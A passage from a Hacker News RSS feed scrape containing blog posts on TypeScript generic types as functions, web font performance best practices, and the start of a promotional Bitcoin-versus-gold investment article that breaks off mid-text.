<div data-language="typescript"><pre><code><span>type</span> Return<span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>T</span> <span>extends</span> <span>(</span><span><span>...</span>args<span>:</span> <span>any</span><span>[</span><span>]</span></span><span>)</span> <span>=&gt;</span> infer <span>R</span> <span>?</span> <span>R</span> <span>:</span> <span>never</span><span>;</span></code></pre></div>
<p>Again, we can rewrite it as a function:</p>
<div data-language="typescript"><pre><code><span>type</span> <span>function</span> <span>Return</span><span>(</span><span><span>T</span><span>:</span> AnyType</span><span>)</span> <span>{</span>
  <span>return</span> <span>T</span><span>.</span><span>isFunctionType</span><span>(</span><span>)</span> <span>&amp;&amp;</span> <span>T</span><span>.</span><span>getArgumentTypes</span><span>(</span><span>)</span><span>.</span><span>extends</span><span>(</span>AnyType<span>[</span><span>]</span><span>)</span>
    <span>?</span> <span>T</span><span>.</span><span>getReturnType</span><span>(</span><span>)</span>
  	<span>:</span> <span>never</span><span>;</span>
<span>}</span></code></pre></div>
<p>In fact, since we don't care about argument types, we can write the more elegant:</p>
<div data-language="typescript"><pre><code><span>type</span> <span>function</span> <span>Return</span><span>(</span><span><span>T</span><span>:</span> AnyType</span><span>)</span> <span>{</span>
  <span>return</span> <span>T</span><span>.</span><span>isFunctionType</span><span>(</span><span>)</span> <span>?</span> <span>T</span><span>.</span><span>getReturnType</span><span>(</span><span>)</span> <span>:</span> <span>never</span><span>;</span>
<span>}</span></code></pre></div>
<h2>Recursion and types</h2>
<p>One potentially challenging aspect of types is that they can be recursive. Here is a <code>LinkedList</code> type:</p>
<div data-language="typescript"><pre><code><span>type</span> LinkedList <span>=</span> <span>{</span>
  value<span>:</span> <span>any</span><span>,</span>
  next<span>:</span> LinkedList <span>|</span> <span>null</span><span>;</span>
<span>}</span></code></pre></div>
<p>The equivalent value would be illegal in JavaScript:</p>
<div data-language="typescript"><pre><code><span>const</span> LinkedList <span>=</span> <span>{</span>
  value<span>:</span> <span>'any'</span><span>,</span>
  next<span>:</span> <span>or</span><span>(</span>LinkedList<span>,</span> <span>null</span><span>)</span>
<span>}</span><span>;</span>
</code></pre></div>
<p>However, the only reason why this is illegal is because JavaScript is <a href="https://en.wikipedia.org/wiki/Eager_evaluation" target="_blank" rel="nofollow noopener noreferrer">eagerly evaluated</a>. That is, a value is evaluated as soon as it's expressed.</p>
<p>Types are different. It is perfectly fine for a type to be self-referential in TypeScript. You could say that types are <a href="https://en.wikipedia.org/wiki/Lazy_evaluation" target="_blank" rel="nofollow noopener noreferrer">lazily evaluated</a>. In fact, you'll find that our "type functions" have no mutable variables or side-effects, i.e. they are pure functions. We could think of the TypeScript type system as a purely functional, lazy-evaluated language!</p>
<h2>Final words</h2>
<p>Let's summarise our findings:</p>
<ul>
<li>Types can be thought of as abstract values and generic types as pure functions on these values.</li>
<li>The TypeScript type system is its own lazily evaluated language.</li>
<li>We've come up with an alternative syntax for generic types, using <code>type function</code>.</li>
</ul>
<p>TypeScript's generic types are well know for their <a href="https://github.com/ghoullier/awesome-template-literal-types" target="_blank" rel="nofollow noopener noreferrer">fairly unreadable syntax</a>. I wonder if we could leverage these insights to make TypeScript more readable, and perhaps unlock even more powerful generic types?</p>
<p>If you're curious to read more insights on computer science and software engineering, I'm working on a book that explores the similarities between programming languages and builds up a universal model of code. Subscribe to my newsletter below to get free access when it's available 🙂</p></article></div>]]>
            </description>
            <link>https://fwouts.com/articles/typescript-generic-types</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771060</guid>
            <pubDate>Thu, 14 Jan 2021 02:27:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web Fonts in 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770995">thread link</a>) | @leerob
<br/>
January 13, 2021 | https://leerob.io/blog/fonts | <a href="https://web.archive.org/web/*/https://leerob.io/blog/fonts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Typography accounts for <a target="_blank" rel="noopener noreferrer" href="https://ia.net/topics/the-web-is-all-about-typography-period/">95% of web design</a>. Your font choice can be critical for branding, readability, and performance.</p><p><a target="_blank" rel="noopener noreferrer" href="https://thehistoryoftheweb.com/web-fonts/">Over time</a>, recommendations for using web fonts have changed as browsers adopted new standards. Now in 2021, I wanted to learn the best practices for using web fonts on high-performance sites.</p><h2 id="system-fonts">System Fonts</h2><p>The fastest way to use a web font is none. Browsers include a set of <a target="_blank" rel="noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Styling_text/Fundamentals#Web_safe_fonts">web-safe fonts</a> (e.g. Arial, Georgia, Times New Roman) you can use by default.</p><p>Using web-safe fonts or the <a target="_blank" rel="noopener noreferrer" href="https://systemfontstack.com/">system font stack</a> will be the fastest option.</p><pre><code><span>font-family</span><span>:</span> -apple-system<span>,</span> BlinkMacSystemFont<span>,</span> <span>'Segoe UI'</span><span>,</span> Helvetica<span>,</span> Arial<span>,</span>
  sans-serif<span>,</span> <span>'Apple Color Emoji'</span><span>,</span> <span>'Segoe UI Emoji'</span><span>,</span> <span>'Segoe UI Symbol'</span><span>;</span>
</code></pre><h2 id="why-use-web-fonts">Why Use Web Fonts?</h2><p>If system fonts are the fastest option, why do web fonts exist? Branding, improved design, and cross browser and device consistency. <a target="_blank" rel="noopener noreferrer" href="https://almanac.httparchive.org/en/2020/fonts">82% of web pages for desktop</a> use web fonts.</p><p>Let's cover five different areas for high-performance web fonts and conclude with a 2021 recommendation.</p><ul><li>Self Hosting</li><li>Preloading</li><li>Font Display</li><li>Variable Fonts</li><li>Subsetting</li></ul><h2 id="self-hosting">Self Hosting</h2><p><a target="_blank" rel="noopener noreferrer" href="https://fonts.google.com/">Google Fonts</a> is responsible for <a target="_blank" rel="noopener noreferrer" href="https://almanac.httparchive.org/en/2020/fonts#serving-with-a-service">70% of all web font usage</a>. With over 1000 fonts, they provide easy access to quality fonts, multiple formats, and performant defaults (pre-connecting and swapping).</p><p>However, <strong>Google Fonts is no longer necessary</strong>. Since 2018, <a target="_blank" rel="noopener noreferrer" href="https://developers.google.com/web/updates/2018/08/web-performance-made-easy">Google has advised self-hosting</a> for optimal performance through preloading.</p><p>There aren't any caching advantages anymore, either. Let's say you're using the font "Roboto", which is <a target="_blank" rel="noopener noreferrer" href="https://fonts.google.com/?sort=popularity">a popular font</a> on Google Fonts. Chances are you've visited another site using "Roboto" and cached the font.</p><p>Since October 2020, Chrome <a target="_blank" rel="noopener noreferrer" href="https://developers.google.com/web/updates/2020/10/http-cache-partitioning">no longer allows</a> a shared cache across sites. Safari has worked this way since 2013. "Roboto" will be re-downloaded for every site, regardless of it being cached.</p><p>When self-hosting, ensure you cache your font with the <code>Cache-Control</code> HTTP header. <code>immutable</code> tells the browser the file will never change. When a request is made within the <code>max-age</code> (1 year), it avoids the roundtrip to ensure it's the latest content.</p><pre><code>Cache-Control: public, immutable, max-age<span>=</span><span>31536000</span>
</code></pre><p>If you need Google Fonts, <a target="_blank" rel="noopener noreferrer" href="https://csswizardry.com/2020/05/the-fastest-google-fonts/">use these optimizations</a>. With the latest changes in the v2 API, you can tailor fonts to specific users and platforms (including variable fonts).</p><h2 id="preloading">Preloading</h2><p>The browser assigns <a target="_blank" rel="noopener noreferrer" href="https://web.dev/prioritize-resources/">loading priorities</a> to different types of resources. By default, CSS will be loaded before scripts and images. You can influence the importance of resources by <a target="_blank" rel="noopener noreferrer" href="https://web.dev/preload-critical-assets/">preloading critical assets</a>.</p><p>Fonts are discovered late by the browser by default. By preloading, we fetch the font file as soon as possible. Then, the browser caches the font making it available immediately.</p><p>Preloading can improve performance metrics like <a target="_blank" rel="noopener noreferrer" href="https://web.dev/interactive">Time to Interactive</a> and <a target="_blank" rel="noopener noreferrer" href="https://web.dev/first-contentful-paint">First Contentful Paint</a>. For example, Shopify saw a <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/ShopifyEng/status/844245243948163072">50% (1.2 second) improvement</a> in First Contentful Paint, removing their Flash of Invisible Text (FOIT).</p><p>As of 2020, <a target="_blank" rel="noopener noreferrer" href="https://almanac.httparchive.org/en/2019/fonts">75% of web fonts use WOFF2</a>. You likely only need this. For example:</p><pre><code>&lt;link
    rel=<span>"preload"</span>
    href=<span>"/fonts/inter-var-latin.woff2"</span>
    as=<span>"font"</span>
    type=<span>"font/woff2"</span>
    crossOrigin=<span>"anonymous"</span>
/&gt;
</code></pre><blockquote><p>Support: All modern browsers except Firefox.</p></blockquote><h2 id="font-display">Font Display</h2><p><code>font-display</code> allows you to modify the rendering behavior of web fonts with values such as <code>auto</code>, <code>swap</code>, <code>block</code>, <code>fallback</code> and <code>optional</code>. When loading web fonts, we want to prevent <a target="_blank" rel="noopener noreferrer" href="https://web.dev/cls/">layout shift</a>. This occurs in two ways:</p><ul><li>Flash of Unstyled Text (FOUT) â€” The fallback font is swapped with a new font (e.g. <code>swap</code>).</li><li>Flash of Invisible Text (FOIT) â€” Invisible text is shown on the page until a new font is rendered (e.g. <code>block</code>).</li></ul><p>Browsers currently have a default strategy similar to <code>block</code>. The only option that eliminates layout shift is <code>optional</code>. Combined with the other performance optimizations in this article, <code>optional</code> is your best choice.</p><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> <span>'Inter'</span><span>;</span>
  <span>font-style</span><span>:</span> normal<span>;</span>
  <span>font-display</span><span>:</span> optional<span>;</span>
  <span>src</span><span>:</span> <span><span>url</span><span>(</span>/fonts/inter-var-latin.woff2<span>)</span></span> <span>format</span><span>(</span><span>'woff2'</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><blockquote><p>Support: All modern browsers</p></blockquote><h2 id="variable-fonts">Variable Fonts</h2><p><a target="_blank" rel="noopener noreferrer" href="https://web.dev/variable-fonts/">Variable fonts</a> allow us to combine multiple styles and weights (e.g. bold, italic) into a single font file.</p><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> <span>'Inter'</span><span>;</span>
  <span>font-style</span><span>:</span> normal<span>;</span>
  <span>font-weight</span><span>:</span> <span>100</span> <span>900</span><span>;</span> // Range of weights supported
  <span>font-display</span><span>:</span> optional<span>;</span>
  <span>src</span><span>:</span> <span><span>url</span><span>(</span>/fonts/inter-var-latin.woff2<span>)</span></span> <span>format</span><span>(</span><span>'woff2'</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><p>You can try out different variable font options <a target="_blank" rel="noopener noreferrer" href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Fonts/Variable_Fonts_Guide">here</a>.</p><blockquote><p>Support: All modern browsers. Even Google Fonts v2 API has support for variable fonts.</p></blockquote><h2 id="subsettings">Subsettings</h2><p>Font files contain multiple languages and glyphs, which increase the file size. Subsetting is the removal of characters you donâ€™t need.</p><p>For example, we might use the Inter variable font and subset to latin languages.</p><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> <span>'Inter'</span><span>;</span>
  <span>font-style</span><span>:</span> normal<span>;</span>
  <span>font-weight</span><span>:</span> <span>100</span> <span>900</span><span>;</span> // Range of weights supported
  <span>font-display</span><span>:</span> optional<span>;</span>
  <span>src</span><span>:</span> <span><span>url</span><span>(</span>/fonts/inter-var-latin.woff2<span>)</span></span> <span>format</span><span>(</span><span>'woff2'</span><span>)</span><span>;</span>
  <span>unicode-range</span><span>:</span> U+<span>0000</span><span>-00</span>FF<span>,</span> U+<span>0131</span><span>,</span> U+<span>0152</span><span>-0153</span><span>,</span> U+<span>02</span>BB<span>-02</span>BC<span>,</span> U+<span>02</span>C<span>6</span><span>,</span> U+<span>02</span>DA<span>,</span>
    U+<span>02</span>DC<span>,</span> U+<span>2000</span><span>-206</span>F<span>,</span> U+<span>2074</span><span>,</span> U+<span>20</span>AC<span>,</span> U+<span>2122</span><span>,</span> U+<span>2191</span><span>,</span> U+<span>2193</span><span>,</span> U+<span>2212</span><span>,</span> U+<span>2215</span><span>,</span>
    U+FEFF<span>,</span> U+FFFD<span>;</span>
<span>}</span>
</code></pre><h2 id="conclusion">Conclusion</h2><ol><li>Use a variable font</li><li>Preload your font file</li><li>Self-host instead of Google Fonts</li><li>Use <code>font-display: optional</code> to prevent layout shift</li></ol><p><a target="_blank" rel="noopener noreferrer" href="https://github.com/leerob/leerob.io">Here's an example</a> of a site implementing all these recommendations.</p><h2 id="future">Future</h2><p>If you need to use <code>font-display: swap</code>, future support for <a target="_blank" rel="noopener noreferrer" href="https://www.youtube.com/watch?t=176&amp;v=Z6wjUOSh9Tk&amp;feature=youtu.be">Font Metrics Override</a> will reduce layout shift when swapping.</p><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> <span>...</span><span>;</span>
  <span>src</span><span>:</span> <span>...</span><span>;</span>
  <span>ascent-override</span><span>:</span> <span>80</span><span>%</span><span>;</span>
  <span>descent-override</span><span>:</span> <span>20</span><span>%</span><span>;</span>
  <span>line-gap-override</span><span>:</span> <span>0</span><span>%</span><span>;</span>
  <span>...</span><span>;</span>
<span>}</span>
</code></pre></div></div></div>]]>
            </description>
            <link>https://leerob.io/blog/fonts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770995</guid>
            <pubDate>Thu, 14 Jan 2021 02:17:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Kill a Unicorn]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770566">thread link</a>) | @chrisfrantz
<br/>
January 13, 2021 | https://www.chrisfrantz.com/how-to-kill-a-unicorn/ | <a href="https://web.archive.org/web/*/https://www.chrisfrantz.com/how-to-kill-a-unicorn/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.chrisfrantz.com/how-to-kill-a-unicorn/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770566</guid>
            <pubDate>Thu, 14 Jan 2021 01:27:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bitcoin VS Gold – What is better for long term investors?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770546">thread link</a>) | @mkmccarty3
<br/>
January 13, 2021 | https://blog.shrimpy.io/blog/bitcoin-vs-gold | <a href="https://web.archive.org/web/*/https://blog.shrimpy.io/blog/bitcoin-vs-gold">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          

          <main>
            
              <section data-content-field="main-content">
                <article id="post-5ff364d3232e037c66e6ae16" data-item-id="5ff364d3232e037c66e6ae16">

    
      
    

    <div data-layout-label="Post Body" data-type="item" data-updated-on="1609787074449" id="item-5ff364d3232e037c66e6ae16"><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1610403289116_12820"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1610404622771-QRN5G5X5R6IUVQS7N24Q/ke17ZwdGBToddI8pDm48kIej_Bs4IN9sM4jsoyK8_2AUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcHgqzNFD5NLVLpJJhLz1H2RJVi-_GSN9yeStoveqpSB5QJf4i0Mn30x6b7xyhnrO5/image-asset.png" data-image="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1610404622771-QRN5G5X5R6IUVQS7N24Q/ke17ZwdGBToddI8pDm48kIej_Bs4IN9sM4jsoyK8_2AUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcHgqzNFD5NLVLpJJhLz1H2RJVi-_GSN9yeStoveqpSB5QJf4i0Mn30x6b7xyhnrO5/image-asset.png" data-image-dimensions="1449x814" data-image-focal-point="0.5,0.5" alt="" data-load="false" data-image-id="5ffcd30eb4127248a4351167" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1610404622771-QRN5G5X5R6IUVQS7N24Q/ke17ZwdGBToddI8pDm48kIej_Bs4IN9sM4jsoyK8_2AUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcHgqzNFD5NLVLpJJhLz1H2RJVi-_GSN9yeStoveqpSB5QJf4i0Mn30x6b7xyhnrO5/image-asset.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-8875eae1f5b416ad242d"><div><p>The complete destruction of fiat currencies, led by the world’s global economic superpowers and their senseless money printing, has left many people wondering whether they should look to hedge themselves against the market. The hegemony of the U.S. dollar has been weakened and the actions taken in 2020 may only be the beginning.</p><p>Considering that a collapse may be imminent, now might be a good time to take a look at the popular store of value assets. Today we have two strong assets that may serve us in that regard: Gold and Bitcoin.&nbsp;</p><p>Both have served as a financial instrument that safeguards against inflation, but which one is more efficient in 2020? Gold may have a long history, but that does not mean that the disruptive technology found in Bitcoin cannot serve as a better option.&nbsp;</p><p>In the following sections, we will showcase bullish cases for both Bitcoin and gold. Moreover, we will also explain why one option may be better than the other for long term investors.&nbsp;</p><p>But before disclosing that information, let’s first see why we have a strong demand for SoV’s and why scarcity is so important in an age where paper currency lost its value.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1610405110242_12502"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1610405188679-S4G2OJP7V1JRE5I4DD3K/ke17ZwdGBToddI8pDm48kIdGOHi6CnttLlm3yOfT5817gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UYIXvY5VJksKzVJIHzky9DhNemqh349ygRgLhUisLFUym7cT0R_dexc_UL_zbpz6JQ/image-asset.png" data-image="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1610405188679-S4G2OJP7V1JRE5I4DD3K/ke17ZwdGBToddI8pDm48kIdGOHi6CnttLlm3yOfT5817gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UYIXvY5VJksKzVJIHzky9DhNemqh349ygRgLhUisLFUym7cT0R_dexc_UL_zbpz6JQ/image-asset.png" data-image-dimensions="2002x1127" data-image-focal-point="0.5,0.5" alt="" src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1610405188679-S4G2OJP7V1JRE5I4DD3K/ke17ZwdGBToddI8pDm48kIdGOHi6CnttLlm3yOfT5817gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UYIXvY5VJksKzVJIHzky9DhNemqh349ygRgLhUisLFUym7cT0R_dexc_UL_zbpz6JQ/image-asset.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div></div>
              

              
                <div><p>When your leader trades, you trade. Shrimpy will automatically update your portfolio to always match your leader’s. Browse through hundreds of cryptocurrency traders to copy.</p></div>
              

              
                <div><div></div></div>
              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610405110242_12798"><div><p>A Store of Value (SoV) asset is simply an asset, commodity, or currency that maintains its value over a longer period of time without depreciating. Investors who seek to protect themselves during an uncertain period or against unprecedented events usually purchase SoV assets to protect their holdings.</p><p>Historically, rare metals <a href="https://onlygold.com/facts-statistics/history-of-gold/#:~:text=Gold%20was%20first%20discovered%20as,part%20of%20every%20human%20culture."><span>such as gold</span></a> have served as great SoV’s due to their scarcity and demand-to-supply ratio. As a matter of fact, most countries have based currencies and paper money on their gold reserves for a long time.</p><p>However, the situation changed through the course of World War 2 - specifically during the <a href="https://2001-2009.state.gov/r/pa/ho/time/wwii/98681.htm#:~:text=The%20Bretton%20Woods%20Conference%2C%20officially,post%2DWWII%20international%20monetary%20system."><span>Bretton Woods conference</span></a><span>.</span> At that point countries all over the world have agreed to get rid of their traditional gold standard model in favor of another system.&nbsp;</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1609787077522_6270"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787116749-HE1H003MGC3X9VM48UC2/ke17ZwdGBToddI8pDm48kL-2NPTcQbX2Z2XyS65Xm6pZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzhrdwph1Syt1erWFyguPX8LigxFe9-DbyRUDsOB_hyrsyS6LI8tnmaaGjhBt58JhM/image-asset.jpeg" data-image="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787116749-HE1H003MGC3X9VM48UC2/ke17ZwdGBToddI8pDm48kL-2NPTcQbX2Z2XyS65Xm6pZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzhrdwph1Syt1erWFyguPX8LigxFe9-DbyRUDsOB_hyrsyS6LI8tnmaaGjhBt58JhM/image-asset.jpeg" data-image-dimensions="512x288" data-image-focal-point="0.5,0.5" alt="" data-load="false" data-image-id="5ff366ec5abd827cadbab634" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787116749-HE1H003MGC3X9VM48UC2/ke17ZwdGBToddI8pDm48kL-2NPTcQbX2Z2XyS65Xm6pZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzhrdwph1Syt1erWFyguPX8LigxFe9-DbyRUDsOB_hyrsyS6LI8tnmaaGjhBt58JhM/image-asset.jpeg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1609787077522_6618"><div><p>From that point on almost all economies in the west have agreed to base their currencies on the official exchange rate of the U.S. dollar against gold.&nbsp;</p><p>The model remained very stable for a short time, but after numerous amendments made during the 70s by the U.S. government, the Bretton Woods Agreements had nothing to do with the modern economy.</p><p>As of 1976, most references to gold were removed from statutes and the definition of the dollar was changed. History then switched into a timeline where global economies were based entirely on pure fiat money, with limited reliance on gold.</p><p>Across all ages of human history, gold was used as the primary form of currency. Even when civilizations deemed gold to be too burdensome for transferring value, paper money backed 100% by gold was still used.</p><p>As we have already mentioned gold is a popular SoV option due to its supply-demand ratio, formally known as stock to flow ratio. The ‘stock’ of mined gold is too small compared to the existing supply, hence why it is the perfect option for storing value with yearly inflation of around 1.5%.</p><p>But with the aforementioned changes that Central Banks have made in the previous century, entire economies were completely redefined. With heavy reliance on the U.S. dollar, instead of gold, banks have paid a high price.&nbsp;</p><p>For many, the current system is based on nothing at all - no economic game theory that can support the value of fiat currencies. Countries like the U.S. are <a href="https://www.usatoday.com/in-depth/money/2020/05/12/coronavirushow-u-s-printing-dollars-save-economy-during-crisis-fed/3038117001/"><span>senselessly printing money</span></a> to keep their economies afloat, in spite of future consequences.&nbsp;</p><p>Currencies resume losing value against each other while the value of commodities and assets keep increasing in an environment where salaries stay the same. As such, the purchasing power of a nation decreases while inflation rises.</p><p>In 2020 alone, the <a href="https://fred.stlouisfed.org/series/M2"><span>U.S. M2 money stock supply</span></a> has increased by 24%. With incoming stimulus bills and further financial injections, it is easy to conclude that the supply of money will resume growing.&nbsp;</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1609787077522_11228"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787140537-11TEIAD03H12ROAQTQQZ/ke17ZwdGBToddI8pDm48kBn-Fipihu31vMW_sbeudalZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwj_jgDy5zN2cALkS5ZkzY8nL1AEoXJPcZC7eYfVfy18c81i58nxghfzUFPdOM5O5U/image-asset.png" data-image="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787140537-11TEIAD03H12ROAQTQQZ/ke17ZwdGBToddI8pDm48kBn-Fipihu31vMW_sbeudalZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwj_jgDy5zN2cALkS5ZkzY8nL1AEoXJPcZC7eYfVfy18c81i58nxghfzUFPdOM5O5U/image-asset.png" data-image-dimensions="512x308" data-image-focal-point="0.5,0.5" alt="" data-load="false" data-image-id="5ff367042fb5c129f26e4fd0" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787140537-11TEIAD03H12ROAQTQQZ/ke17ZwdGBToddI8pDm48kBn-Fipihu31vMW_sbeudalZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwj_jgDy5zN2cALkS5ZkzY8nL1AEoXJPcZC7eYfVfy18c81i58nxghfzUFPdOM5O5U/image-asset.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1609787077522_11566"><div><p>With the aforementioned points in mind, we see that fiat currencies are falling apart. As a result, many individuals are turning to SoV assets such as Bitcoin or gold. But why is Bitcoin a good SoV and is it better than gold?</p><p>Bitcoin is far more than just imaginary digital money. In fact, the coins are backed by real monetary value which is kept stable by the asset’s limited supply. Bitcoin is often referred to as digital gold and has been used as an SoV on numerous occasions, but why?</p><p>The anonymous creator <a href="https://bitcoin.org/bitcoin.pdf"><span>Satoshi Nakamoto designed Bitcoin</span></a> in such a way that it can generate only 21 million coins. This is the first efficient tier that gives value to Bitcoin, but is there anything else?</p><p>On BTC’s blockchain network, miners keep the system alive by validating transactions. In return, they are rewarded with Bitcoin for every block of transaction that is verified. For a sensible price evolution, Nakamoto added a <a href="https://www.bitcoinblockhalf.com/"><span>4-year system</span></a> in which mining rewards are halved.</p><p>By doing so, Nakamoto made it possible for Bitcoin’s mineable coins to always remain drastically lower compared to the existing circulating supply. On that account, the leading cryptocurrency behaves exactly like gold as it keeps a stable stock-to-flow ratio.&nbsp;</p><p>With incredibly high scarcity, fungibility, portability, and divisibility, Bitcoin is a clear contender in the area of store-of-value assets.&nbsp;</p><p>As a matter of fact, three of these features are considered to be the properties of good money. But are the aforementioned features better in the case of Bitcoin compared to gold?</p><p>Those who believe that Bitcoin is ‘digital gold’ have three great reasons. BTC is not only great for its scarcity and limited supply but for its other characteristics which have historically been used to describe ‘good money.’</p><p>Scarcity and durability may result in a good asset, but these features alone are not enough for a currency.&nbsp;</p><p>If you wanted an SoV, a currency, and a speculative financial instrument all in one asset then Bitcoin is a perfect choice. Here are three reasons why Bitcoin is better than gold in this context.</p><h2>Portability</h2><p>Portability is obviously the first aspect that comes to one’s mind when comparing these two assets. Portability is the main feature of a currency as it allows individuals to seamlessly transfer value without any difficulty.&nbsp;</p><p>It may be easier to transfer $1 million worth of gold compared to $1 million worth of oil but can we do better? Bitcoin is naturally superior compared to precious and rare metals when it comes to portability as it only takes a few clicks to transfer value.</p><p>One million worth of gold weighs around 220 pounds. Besides the weight, we also need to account for the means of transportation, carry load, and security.&nbsp;</p><p>Depending on where you want to ship gold, it might take days if not weeks to do so. Administrative problems such as documenting the transfer and dealing with customs is yet another problem.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1609787077522_16211"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
